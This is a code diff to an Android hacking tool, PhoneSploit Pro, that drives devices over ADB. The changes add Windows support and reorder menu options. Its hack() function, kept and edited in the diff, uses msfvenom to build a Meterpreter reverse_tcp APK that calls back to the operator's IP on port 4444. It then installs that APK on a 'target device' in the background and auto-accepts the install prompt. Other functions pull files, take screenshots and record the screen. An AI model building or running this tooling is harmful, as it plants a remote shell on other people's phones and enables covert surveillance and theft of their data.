@@ -9,16 +9,24 @@ from modules import banner
 
 def start():
     # Checking OS
+    global operating_system
     operating_system = platform.system()
-    global clear
     if operating_system == 'Windows':
         # Windows specific configuration
-        os.system('if not exist Downloaded-Files mkdir Downloaded-Files')
-        clear = 'cls'
+        windows_config()
     else:
         # On Linux / macOS
+        # Creates a folder to store pulled files
         os.system('mkdir -p Downloaded-Files')
         check_packages()  # Checking for required packages
+
+
+def windows_config():
+    global clear, opener
+    clear = 'cls'
+    opener = 'start'
+    # Creates a folder to store pulled files
+    os.system('if not exist Downloaded-Files mkdir Downloaded-Files')
 
 
 def check_packages():
@@ -68,7 +76,7 @@ def check_packages():
 
     python_version = platform.python_version()
     if python_version < '3.10':
-        print("\nPlease update Python to version 3.10 or higher to run this program.\n")
+        print("\nPlease update Python to version 3.10 or Newer to run this program.\n")
         exit_phonesploit_pro()
         return
 
@@ -76,16 +84,7 @@ def check_packages():
 def display_menu():
     ''' Displays a random banner and menu'''
     print(random.choice(banner.banner_list))  # Prints a random banner
-    menu = '''
-
-    1. Connect a device             6. Get screenshot                11. Run an app
-    2. List connected devices       7. List installed apps           12. Uninstall an app
-    3. Disconnect all devices       8. Download file from device     13. Screen Record
-    4. Access device shell          9. Send file to device           14. Restart device
-    5. Stop ADB server             10. Install an APK                15. Hack Device (Using Metasploit)
-
-    '''
-    print(menu)
+    print(banner.menu)
 
 
 def clear_screen():
@@ -142,14 +141,14 @@ def get_screenshot():
     # Asking to open file
     choice = input('\nDo you want to Open the file? [Y / N] > ').lower()
     if choice == 'y':
-        os.system(f"xdg-open {destination}/screen.png")
+        os.system(f"{opener} {destination}/screen.png")
 
     elif not choice == 'n':
         while choice != 'y' and choice != 'n':
             choice = input(
                 '\nInvalid choice!, Press Y or N > ').lower()
             if choice == 'y':
-                os.system(f"xdg-open {destination}/screen.png")
+                os.system(f"{opener} {destination}/screen.png")
 
     print("\n")
 
@@ -174,14 +173,14 @@ def screenrecord():
     # Asking to open file
     choice = input('\nDo you want to Open the file? [Y / N] > ').lower()
     if choice == 'y':
-        os.system(f"xdg-open {destination}/demo.mp4")
+        os.system(f"{opener} {destination}/demo.mp4")
 
     elif not choice == 'n':
         while choice != 'y' and choice != 'n':
             choice = input(
                 '\nInvalid choice!, Press Y or N > ').lower()
             if choice == 'y':
-                os.system(f"xdg-open {destination}/demo.mp4")
+                os.system(f"{opener} {destination}/demo.mp4")
     print("\n")
 
 
@@ -199,14 +198,14 @@ def pull_file():
     # Asking to open file
     choice = input('\nDo you want to Open the file? [Y / N] > ').lower()
     if choice == 'y':
-        os.system(f"xdg-open {destination}/{location}")
+        os.system(f"{opener} {destination}/{location}")
 
     elif not choice == 'n':
         while choice != 'y' and choice != 'n':
             choice = input(
                 '\nInvalid choice!, Press Y or N > ').lower()
             if choice == 'y':
-                os.system(f"xdg-open {destination}/{location}")
+                os.system(f"{opener} {destination}/{location}")
 
 
 def push_file():
@@ -296,6 +295,7 @@ Use 'Ctrl + C' to stop at any point
 
 def hack():
     instructions()
+    os.system(clear)
     print(banner.hacking_banner)
     ip = get_ip_address()  # getting IP Address to create payload
     print(f"\nUsing IP Address : {ip} to create payload\n")
@@ -304,8 +304,14 @@ def hack():
     os.system(
         f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT=4444 > test.apk")
     print("\nInstalling APK to target device...\n")
-    # installing apk to device (used & to execute command in background)
-    os.system("adb install test.apk &")
+
+    # installing apk to device
+    if operating_system == 'Windows':
+        # (used 'start /b' to execute command in background)
+        os.system("start /b adb install test.apk")
+    else:
+        # (used ' &' to execute command in background)
+        os.system("adb install test.apk &")
     time.sleep(5)  # waiting for apk to be installed
 
     # Keyboard input to accept app install
@@ -355,19 +361,19 @@ def main():
         case '6':
             get_screenshot()
         case '7':
-            list_apps()
+            screenrecord()
         case '8':
             pull_file()
         case '9':
             push_file()
         case '10':
-            install_app()
-        case '11':
             launch_app()
+        case '11':
+            install_app()
         case '12':
             uninstall_app()
         case '13':
-            screenrecord()
+            list_apps()
         case '14':
             reboot()
         case '15':
@@ -380,7 +386,9 @@ def main():
 
 # Global variables
 run_phonesploit_pro = True
+operating_system = ''
 clear = 'clear'
+opener = 'xdg-open'
 
 start()
 
